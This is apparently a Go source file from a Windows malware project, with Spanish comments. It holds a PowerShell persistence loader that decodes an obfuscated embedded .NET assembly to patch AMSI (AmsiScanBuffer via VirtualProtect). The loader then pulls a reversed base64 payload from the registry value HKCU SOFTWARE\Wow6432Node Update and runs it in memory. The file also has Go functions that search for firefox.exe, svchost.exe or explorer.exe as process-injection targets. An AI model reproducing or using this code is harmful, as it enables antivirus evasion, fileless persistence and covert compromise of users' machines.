package utils

import (
	"github.com/TheTitanrain/w32"
	"time"
	"unsafe"
)

const (
	//Aca toca revisar como esta encodeado el payload para convertirlo
	PersistenceLoader = `$GOODADY = "TVqQ\\M\\\\E\\\\//8\\Lg\\\\\\\\\Q\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\g\\\\\4fug4\t\nNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJ\\\\\\\\\BQRQ\\T\ED\JrISck\\\\\\\\\\O\\Ii\L\T\\\\4\\\\I\\\\\\\\Viw\\\\g\\\\Q\\\\\\\E\\g\\\\\g\\B\\\\\\\\\\G\\\\\\\\\\C\\\\\\g\\\\\\\\M\YIU\\B\\\B\\\\\\E\\\E\\\\\\\\B\\\\\\\\\\\\\\\\Ms\\BP\\\\\E\\\E\E\\\\\\\\\\\\\\\\\\\\\\\\\G\\\\w\\\\cKw\\O\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\I\\\C\\\\\\\\\\\\\\\CC\\\Eg\\\\\\\\\\\\\\C50ZXh0\\\\d\w\\\\g\\\\Dg\\\\I\\\\\\\\\\\\\\\\\\C\\\G\ucnNyYw\\\E\E\\\\Q\\\\\Y\\\\Q\\\\\\\\\\\\\\\\\\B\\\B\LnJlbG9j\\\M\\\\\G\\\\\C\\\\Fg\\\\\\\\\\\\\\\\\\Q\\\Qg\\\\\\\\\\\\\\\\\\\\\3L\\\\\\\\Eg\\\\C\\U\RCE\\NgJ\\\B\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\BswB\Cv\\\\\Q\\EQ\\KB\\\\oejRU\\\El0\M\\\QoEQ\\Cm8S\\\KCigQ\\\KHw6NFQ\\\SXQ\g\\BCgR\\\KbxI\\\oLBigF\\\GD\gHK\Q\\\YNCX4B\\\EjmlqKBM\\\ofQBIEK\Y\\\YmfgE\\\QWCX4B\\\EjmkoF\\\CgBy\Q\\cCgV\\\K\\DeKhMF\HIP\\BwEQVvFg\\CigX\\\K\HIP\\BwEQVvG\\\CigX\\\K\\De\Co\\R\\\\\\\QCDh\\qEQ\\\SICKBk\\\o\KlIXjRU\\\ElFiDD\\\\nI\B\\\EKiICKBk\\\o\KgBCU0pC\Q\B\\\\\\\M\\\\djQuMC4zMDMxOQ\\\\\F\Gw\\\\4\w\\I34\\KQD\\CIB\\\I1N0cmluZ3M\\\\\L\g\\CQ\\\\jVVM\U\g\\B\\\\\jR1VJR\\\\G\I\\B4\Q\\I0Jsb2I\\\\\\\\\\g\\\VeV\jQJ\g\\\PoBMw\W\\\B\\\\Gw\\\\U\\\\D\\\\Bw\\\\c\\\\Z\\\\Dw\\\\E\\\\B\\\\\Q\\\\M\\\\C\\\\\Q\\\\E\\\\B\\\\\\\c\wE\\\\\\\Y\U\Ky\wY\vQKy\wY\h\G\\w8\0gM\\\Y\r\E+\wY\MwI+\wY\F\I+\wY\p\I+\wY\c\I+\wY\iQI+\wY\wwE+\wY\m\GT\wY\dgGT\wY\9wE+\wY\3gHw\gY\GwQ3\wY\WQM3\wY\WwGy\wY\UQE3\wY\5wJZB\Y\2wI3\wY\7\Oy\wY\bwQ3\wY\FgE3\wY\e\M3\wY\F\OT\wY\KQE3\w\\\\\+\\\\\\\B\\E\\Q\Q\Og\\\BB\\E\\Q\B\B\\9wBj\0E\\g\E\\\B\\BH\\\\QQ\C\\g\EwE\\\o\\\BN\\Q\C\\R\OEDYg\z\WY\Zg\z\ac\agBQI\\\\\CW\PsDbQ\B\Bwh\\\\\IYYawMG\\E\JSE\\\\\kRhx\20\\Q\\\\\\g\CWI\IEcQ\B\\\\\\C\\JYgegR3\\M\\\\\\I\\li\xBHw\B\\6IQ\\\\CGGGsDBg\I\\\\\Q\x\Q\\\g\5\Q\\\QBC\Q\\\Q\RB\\\\gDg\g\\\wB\B\I\B\\iB\k\awMB\BE\awMG\Bk\awMK\Ck\awMQ\DE\awMQ\Dk\awMQ\EE\awMQ\Ek\awMQ\FE\awMQ\Fk\awMQ\GE\awMV\Gk\awMQ\HE\awMQ\Hk\awMQ\JE\awMG\KE\7Q\k\LE\ZQQp\KE\CgMx\Mk\TQQ3\NE\dQQ8\Nk\RwFF\Ik\CgFK\Nk\RwFO\Ik\U\NU\IE\awMG\C4\CwCF\C4\EwCO\C4\GwCt\C4\IwC2\C4\KwC2\C4\MwDS\C4\OwC2\C4\QwC2\C4\SwDY\C4\UwDS\C4\WwDS\C4\YwDw\C4\aw\a\S4\cw\n\YM\ewBx\QE\Dg\\\\U\Gg\B\\\BCQ\CB\E\\\EL\HoE\Q\\\Q0\MQQB\Fws\\\C\Gws\\\D\\S\\\\B\\\\\\\\\\\\\\\\\Cc\\\\E\\\\\\\\\\\\\\BZ\\EB\\\\\\U\B\\\\\BrZXJuZWwzMgBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTE0\EM2ODRFMTc1QjgzMTVCQUFCOUVGRDQ\PE1vZHVsZT4\PFByaXZhdGVJbXBsZW1lbnRhdGlvbkRldGFpbHM+\D\4MjdGRjEyMzZCRUE1MkJCREVBNDUwOEVGODE2ODUwMTRCMDc1MDlCMEVGODBGNkYxOUE0MUYxMjQ4QTYxOEI\MTNCOEEyNzM5QzRCOENCNzhDRDZFQzI4NkY5NkQwQTVDODdDQkJGNEU4MTNEMjk1QjU5NDQ5MjEyQTEzNzhBQgBQRVBF\GdldF9BU0NJSQBTUElERVJNQU4\bXNjb3JsaWI\Z2V0X01lc3NhZ2U\UnVudGltZUZpZWxkSGFuZGxl\ENvbnNvbGU\aE1vZHVsZQBwcm9jTmFtZQBuYW1l\FdyaXRlTGluZQBWYWx1ZVR5cGU\Q29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGU\R3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRl\ENvbVZpc2libGVBdHRyaWJ1dGU\QXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGU\QXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGU\QXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRl\EFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGU\UnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGU\Qnl0ZQBkd1NpemU\RW5jb2Rpbmc\U3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBHZXRTdHJpbmc\TWFyc2hhb\BDNjg0RTE3NUI4MzE1QkFBQjlFRkQ0LmRsb\BTeXN0ZW0\U3lzdGVtLlJlZmxlY3Rpb24\Z2V0X0lubmVyRXhjZXB0aW9u\EFtc2lGdW4\LmN0b3I\LmNjdG9y\FVJbnRQdHI\U3lzdGVtLkRpYWdub3N0aWNz\FN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2Vz\ERlYnVnZ2luZ01vZGVz\HBhdGNoQnl0ZXM\UnVudGltZUhlbHBlcnM\QnlwYXNz\EdldFByb2NBZGRyZXNz\GxwQWRkcmVzcwBPYmplY3Q\bHBmbE9sZFByb3RlY3Q\VmlydHVhbFByb3RlY3Q\ZmxOZXdQcm90ZWN0\G9wX0V4cGxpY2l0\FN5c3RlbS5UZXh0\EluaXRpYWxpemVBcnJheQBDb3B5\ExvYWRMaWJyYXJ5\\\\\\1i\Hk\c\Bh\HM\cw\\ES\\WwB4\F0\I\B7\D\\fQ\\\\\\\7OMs\NQt0yuxOR1RPOKHQ\EI\EBC\Mg\\EFI\EBEREEI\EBDgQg\QECCQcGDg4YG\kSRQQ\\BJRBw\C\RJdEWEFI\EOHQUE\\EZCwg\B\EdBQgYC\Q\\QEO\y\\DgU\\gEOH\Qg\BJFCLd6XFYZNOCJ\wYdBQMGERQCBgoD\\\BBQ\CGBgOB\\BG\4I\\QCGBkJE\kI\Q\I\\\\\\\e\Q\B\FQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBC\E\BwE\\\\\GwE\FkM2ODRFMTc1QjgzMTVCQUFCOUVGRDQ\\\UB\\\\\BcB\BJDb3B5cmlnaHQgwqkgIDIwMj\\\CkB\CQ0MzFlZjJkOS01Y2NhLTQxZDMtODdiYS1jN2Y1ZTQ1ODJkZDI\\\wB\\cxLj\uMC4w\\BJ\Q\aLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjUB\FQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lEi5ORVQgRnJhbWV3b3JrIDQuNQQB\\\\\\\\\\\\bq1jpw\\\\\C\\\\rw\\\FQr\\BUDQ\\\\\\\\\\\\\\\\\\E\\\\\\\\\\\\\\\\\\\\FJTRFPb1liqIUq3R4pjF0gJMv3G\Q\\\EM6XFVzZXJzXHBlbnRlXERlc2t0b3BcR09MRFxwcm95ZWN0b3NcRnVuV2l0aEFNU0ktbWFzdGVyIC0gY29waWFcRnVuV2l0aEFNU0ktbWFzdGVyXDRfZGVjaW1hbF90b19hc2NpaVxBbXNpQnlwYXNzXG9ialxEZWJ1Z1xDNjg0RTE3NUI4MzE1QkFBQjlFRkQ0LnBkYg\rL\\\\\\\\\\\\\BFL\\\\C\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\Nyw\\\\\\\\\\\\\\\BfQ29yRGxsTWFpbgBtc2NvcmVlLmRsb\\\\\\\\P8l\C\\EEFtc2lTY2FuQnVmZmVy\\BhbXNpLmRsb\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\Q\Q\\\\G\\\g\\\\\\\\\\\\\\\\\\\\Q\B\\\\M\\\g\\\\\\\\\\\\\\\\\\\\Q\\\\\\S\\\\Fh\\\Dk\w\\\\\\\\\\\\Dk\zQ\\\BW\FM\XwBW\EU\UgBT\Ek\TwBO\F8\SQBO\EY\Tw\\\\\\vQTv/g\\\Q\\\\E\\\\\\\\\\Q\\\\\\Pw\\\\\\\\\E\\\\\g\\\\\\\\\\\\\\\\\\\EQ\\\\B\FY\YQBy\EY\aQBs\GU\SQBu\GY\bw\\\\\\J\\E\\\\V\By\GE\bgBz\Gw\YQB0\Gk\bwBu\\\\\\\\\L\ER\M\\\E\UwB0\HI\aQBu\Gc\RgBp\Gw\ZQBJ\G4\ZgBv\\\\I\M\\\E\M\\w\D\\M\\w\DQ\Yg\w\\\\Rg\X\\E\QwBv\G0\bQBl\G4\d\Bz\\\\Qw\2\Dg\N\BF\DE\Nw\1\EI\O\\z\DE\NQBC\EE\QQBC\Dk\RQBG\EQ\N\\\\\\\Tg\X\\E\QwBv\G0\c\Bh\G4\eQBO\GE\bQBl\\\\\\BD\DY\O\\0\EU\MQ\3\DU\Qg\4\DM\MQ\1\EI\QQBB\EI\OQBF\EY\R\\0\\\\\\BW\Bc\\QBG\Gk\b\Bl\EQ\ZQBz\GM\cgBp\H\\d\Bp\G8\bg\\\\\\Qw\2\Dg\N\BF\DE\Nw\1\EI\O\\z\DE\NQBC\EE\QQBC\Dk\RQBG\EQ\N\\\\\\\M\\I\\E\RgBp\Gw\ZQBW\GU\cgBz\Gk\bwBu\\\\\\\x\C4\M\\u\D\\Lg\w\\\\Vg\b\\E\SQBu\HQ\ZQBy\G4\YQBs\E4\YQBt\GU\\\BD\DY\O\\0\EU\MQ\3\DU\Qg\4\DM\MQ\1\EI\QQBB\EI\OQBF\EY\R\\0\C4\Z\Bs\Gw\\\\\\Eg\Eg\B\Ew\ZQBn\GE\b\BD\G8\c\B5\HI\aQBn\Gg\d\\\\EM\bwBw\Hk\cgBp\Gc\a\B0\C\\qQ\g\C\\Mg\w\DI\M\\\\Co\\Q\B\Ew\ZQBn\GE\b\BU\HI\YQBk\GU\bQBh\HI\awBz\\\\\\\\\\\\Xg\b\\E\TwBy\Gk\ZwBp\G4\YQBs\EY\aQBs\GU\bgBh\G0\ZQ\\\EM\Ng\4\DQ\RQ\x\Dc\NQBC\Dg\Mw\x\DU\QgBB\EE\Qg\5\EU\RgBE\DQ\LgBk\Gw\b\\\\\\\Tg\X\\E\U\By\G8\Z\B1\GM\d\BO\GE\bQBl\\\\\\BD\DY\O\\0\EU\MQ\3\DU\Qg\4\DM\MQ\1\EI\QQBB\EI\OQBF\EY\R\\0\\\\\\\0\\g\\QBQ\HI\bwBk\HU\YwB0\FY\ZQBy\HM\aQBv\G4\\\\x\C4\M\\u\D\\Lg\w\\\\O\\I\\E\QQBz\HM\ZQBt\GI\b\B5\C\\VgBl\HI\cwBp\G8\bg\\\DE\Lg\w\C4\M\\u\D\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\g\\\M\\\\WDw\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"
[Byte[]]$HX=[System.Convert]::FromBase64String($GOODADY.Replace('\','A'))
[void][System.Reflection.Assembly]::Load([byte[]]($HX))
[pepe]::Bypass()


$string = ([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('SOFTWARE\Wow6432Node\').GetValue('Update'))
$instancia = "C#r#e#a#te#In#s#t#a#n#c#e" -replace("#","")
$assembly = [AppDomain]::CurrentDomain.Load([Convert]::("Frombase--/_____ing"-replace "--/_____","64Str")(-join $string.replace('#','A')[-1..-$string.Length]));
$methodInfo = $assembly.EntryPoint;
$create = $assembly.$instancia($methodInfo.Name);
start-sleep 2
$methodInfo.Invoke($100000000000000000000000000,$100000000000000000000000000);
`
)

func GetProcessName(id uint32) string {
	//Obtiene el nombre del proceso en el que nos queremos inyectar
	snapshot := w32.CreateToolhelp32Snapshot(w32.TH32CS_SNAPMODULE, id)
	var me w32.MODULEENTRY32
	me.Size = uint32(unsafe.Sizeof(me))

	if w32.Module32First(snapshot, &me) {
		return w32.UTF16PtrToString(&me.SzModule[0])

	}
	return "Error"
}

func GetProcessId() uint32 {
	targetprocesses := []string{"firefox.exe", "svchost.exe", "explorer.exe"}
	sz := uint32(1000)
	process := make([]uint32, sz)
	var returnedbytes uint32

	for _, proc := range targetprocesses {
		if w32.EnumProcesses(process, sz, &returnedbytes) {
			for _, pid := range process[:int(returnedbytes)/4] {
				if GetProcessName(pid) == proc {
					return pid
				} else {
					time.Sleep(14 * time.Millisecond)
				}
			}
		}

	}
	return 0
}
